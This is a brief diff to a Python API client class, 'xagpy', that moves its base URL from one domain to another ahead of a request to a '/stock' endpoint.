@@ -6,7 +6,7 @@ class xagpy:
         if api_token is None or api_token == "":
             raise ValueError("API token is invalid")
         self.api_token = api_token
-        self.base_url = "https://xag.fly.dev/api"
+        self.base_url = "https://start-pasting.today/api"
         try:
             response = requests.get(f"{self.base_url}/stock", timeout=3)
         except Exception as e:  # probably works i havent tested too much
